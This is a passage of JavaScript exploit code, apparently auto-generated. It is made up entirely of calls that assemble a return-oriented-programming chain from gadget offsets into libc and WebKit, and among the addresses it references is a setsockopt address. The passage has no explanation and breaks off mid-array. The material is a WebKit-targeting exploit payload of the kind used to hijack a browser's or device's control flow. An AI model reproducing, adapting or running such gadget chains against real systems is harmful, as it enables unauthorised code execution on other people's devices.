db([0, 0]); 
set_gadget(libc_base+206806,); 
db([1, 0]); 
set_gadget(libc_base+788575,); 
db([1, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+203808, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+203824, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+203792, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+877175, 
libc_base+793877, 
ropchain+203928, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+203944, 
webkit_base+7438103, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
webkit_base+1838146, 
libc_base+793877 
]);
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+788575 
]);
db([8, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+50775, 
libc_base+793877, 
ropchain+204112, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([1, 0]); 
set_gadget(libc_base+788575,); 
db([1, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+204264, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+204280, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+204248, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+877175, 
libc_base+793877, 
ropchain+204424, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+204392, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([4294967295, 4294967295]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+582033, 
libc_base+793877, 
ropchain+204480, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+792472 
]);
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877, 
ropchain+204536, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
webkit_base+5202439, 
libc_base+793877, 
ropchain+204632, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+204648, 
webkit_base+7438103, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
webkit_base+1838146, 
libc_base+793877, 
ropchain+204736, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877, 
ropchain+204792, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+204864, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877, 
ropchain+204920, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadgets([
webkit_base+954100, 
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+205008, 
webkit_base+7438103, 
libc_base+759626, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+547636, 
libc_base+793877, 
ropchain+205112, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+205128, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877, 
ropchain+205200, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+205216, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+191169, 
libc_base+793877, 
ropchain+205368, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+205400, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+205384, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+205352, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+205472, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+205488, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+205600, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+205568, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+11676600, 
libc_base+269973, 
libc_base+793877, 
ropchain+205728, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+205744, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+205712, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+205848, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+205912, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+205864, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+11676600, 
libc_base+269973, 
webkit_base+414627, 
libc_base+793877, 
ropchain+206024, 
libc_base+547636, 
libc_base+186490, 
libc_base+793877, 
ropchain+206016, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+811575 
]);
db([0, 0]); 
set_gadgets([
ropchain+206040, 
ropchain+207752, 
libc_base+793877, 
ropchain+206080, 
webkit_base+7438103, 
libc_base+759626, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+547636, 
libc_base+793877, 
ropchain+206184, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+206200, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877, 
ropchain+206320, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+206352, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+206304, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([16, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
libc_base+793877, 
ropchain+206440, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+206456, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+191169, 
libc_base+793877, 
ropchain+206608, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+206640, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+206624, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+206592, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+206736, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+206720, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+788575, 
ropchain+206840, 
libc_base+793877 
]);
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+811575, 
ropchain+177208, 
libc_base+882884, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+206976, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+206992, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+206960, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+207088, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+207072, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+50775, 
libc_base+793877, 
ropchain+207168, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([65, 0]); 
set_gadget(libc_base+788575,); 
db([65, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+207320, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+207336, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+207304, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
webkit_base+14959219, 
libc_base+389047, 
libc_base+269973, 
libc_base+793877, 
ropchain+207504, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+207520, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+207488, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+207640, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+207672, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+207624, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+11676600, 
libc_base+389047, 
libc_base+269973, 
libc_base+793877, 
ropchain+207744, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadgets([
libc_base+882884, 
libc_base+793877, 
ropchain+207864, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+207880, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+207848, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+207984, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+208032, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+208000, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+11676600, 
libc_base+269973, 
webkit_base+414627, 
libc_base+793877, 
ropchain+208144, 
libc_base+547636, 
libc_base+186490, 
libc_base+793877, 
ropchain+208136, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+811575 
]);
db([0, 0]); 
set_gadgets([
ropchain+208160, 
ropchain+210104, 
libc_base+788575 
]);
db([24, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+759626, 
libc_base+793877, 
ropchain+208264, 
webkit_base+7438103, 
libc_base+793877 
]);
db([4294967264, 4294967295]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
libc_base+793877 
]);
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+788575 
]);
db([25, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+788575 
]);
db([41, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877, 
ropchain+208448, 
webkit_base+7438103, 
libc_base+759626, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+547636, 
libc_base+793877, 
ropchain+208552, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+208568, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877, 
ropchain+208688, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+208720, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+208672, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([16, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
libc_base+793877, 
ropchain+208808, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+208824, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+191169, 
libc_base+793877, 
ropchain+208976, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+209008, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+208992, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+208960, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+209104, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+209088, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+788575, 
ropchain+209208, 
libc_base+793877 
]);
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+811575, 
ropchain+211624, 
libc_base+882884, 
libc_base+793877 
]);
db([4294967256, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+209344, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+209360, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+209328, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+209464, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+209512, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+209480, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+11676600, 
libc_base+269973, 
webkit_base+414627, 
libc_base+793877, 
ropchain+209624, 
libc_base+547636, 
libc_base+186490, 
libc_base+793877, 
ropchain+209616, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+811575 
]);
db([0, 0]); 
set_gadgets([
ropchain+209640, 
ropchain+210088, 
libc_base+50775, 
libc_base+793877, 
ropchain+209696, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+191169, 
libc_base+793877, 
ropchain+209864, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+209896, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+209880, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+209848, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+209968, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+209984, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+210080, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+210064, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+811575, 
ropchain+210120, 
libc_base+811575, 
ropchain+210136, 
libc_base+811575, 
ropchain+204968, 
libc_base+50775, 
libc_base+793877, 
ropchain+210176, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([1, 0]); 
set_gadget(libc_base+788575,); 
db([1, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+210304, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+210288, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877, 
ropchain+210384, 
webkit_base+7438103, 
libc_base+759626, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+547636, 
libc_base+793877, 
ropchain+210488, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+210504, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877, 
ropchain+210608, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+210592, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877, 
ropchain+210664, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadgets([
webkit_base+954100, 
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+50775, 
libc_base+793877, 
ropchain+210752, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([1, 0]); 
set_gadget(libc_base+788575,); 
db([1, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+210880, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+210864, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877, 
ropchain+210960, 
webkit_base+7438103, 
libc_base+759626, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+547636, 
libc_base+793877, 
ropchain+211064, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+211080, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877, 
ropchain+211184, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+211168, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877, 
ropchain+211240, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+547636, 
webkit_base+954100, 
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+211392, 
webkit_base+7438103, 
libc_base+759626, 
libc_base+793877, 
ropchain+211376, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+211488, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+211504, 
webkit_base+7438103, 
webkit_base+432898 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+211616, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+211600, 
webkit_base+7438103, 
libc_base+788575 
]);
db([0, 0]); 
set_gadget(libc_base+811575,); 
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([208, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+788575, 
libc_base+206806, 
libc_base+471355, 
libc_base+793877 
]);
db([4294967280, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+788575, 
libc_base+793877, 
libc_base+471355, 
libc_base+248252, 
libc_base+788575, 
webkit_base+105267, 
libc_base+471355, 
libc_base+248252, 
libc_base+788575, 
libc_base+792472, 
libc_base+471355, 
libc_base+248252, 
libc_base+788575, 
webkit_base+432898, 
libc_base+471355, 
libc_base+248252, 
libc_base+788575, 
webkit_base+10235455, 
libc_base+471355, 
libc_base+248252, 
libc_base+788575, 
libc_base+785193, 
libc_base+471355, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+788575, 
libc_base+11, 
libc_base+471355, 
libc_base+248252, 
libc_base+788575, 
libc_base+11, 
libc_base+471355, 
libc_base+248252, 
libc_base+788575, 
libc_base+793877, 
libc_base+471355, 
libc_base+793877 
]);
db([4294967280, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+788575, 
webkit_base+7438103, 
libc_base+471355, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+788575, 
libc_base+792472, 
libc_base+471355, 
libc_base+793877 
]);
db([4294967280, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+788575, 
libc_base+206806, 
libc_base+471355, 
libc_base+248252, 
libc_base+788575, 
webkit_base+432898, 
libc_base+471355, 
libc_base+248252, 
libc_base+788575, 
libc_base+811575, 
libc_base+471355, 
libc_base+248252, 
libc_base+191168, 
libc_base+793877 
]);
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877 
]);
db([4294967280, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+191168, 
libc_base+793877 
]);
db([208, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877 
]);
db([4294967080, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+191168, 
libc_base+793877 
]);
db([200, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877 
]);
db([4294967088, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+191168, 
libc_base+793877 
]);
db([192, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877 
]);
db([4294967096, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+191168, 
libc_base+793877 
]);
db([184, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877 
]);
db([4294967104, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+191168, 
libc_base+793877 
]);
db([176, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877 
]);
db([4294967112, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+191168, 
libc_base+793877 
]);
db([168, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877 
]);
db([4294967272, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+50775, 
libc_base+792472 
]);
db([4294967280, 4294967295]); 
set_gadgets([
webkit_base+5202439, 
libc_base+792472, 
setsockopt_addr,
webkit_base+2997875, 
libc_base+793877 
]);
db([4294967192, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+50775, 
libc_base+793877 
]);
db([48, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877 
]);
db([4294967280, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+759626, 
libc_base+471355, 
libc_base+793877 
]);
db([32, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+50775, 
libc_base+793877 
]);
db([24, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877 
]);
db([128, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+50775, 
libc_base+793877, 
ropchain+212944, 
webkit_base+7438103, 
libc_base+811575 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+213016, 
webkit_base+7438103, 
libc_base+759626, 
webkit_base+432898 
]);
db([0, 0]); 
set_gadgets([
libc_base+471355, 
libc_base+50775, 
libc_base+793877, 
ropchain+213080, 
webkit_base+7438103, 
libc_base+759626, 
webkit_base+432898 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+759626, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([16, 0]); 
set_gadgets([
libc_base+547636, 
libc_base+793877, 
ropchain+213232, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+213248, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877, 
ropchain+213352, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+213336, 
webkit_base+7438103, 
libc_base+759626, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+547636, 
webkit_base+2997875, 
libc_base+793877, 
ropchain+213432, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadgets([
libc_base+793877, 
ropchain+213480, 
webkit_base+7438103, 
libc_base+759626, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+547636, 
libc_base+793877, 
ropchain+213584, 
webkit_base+7438103, 
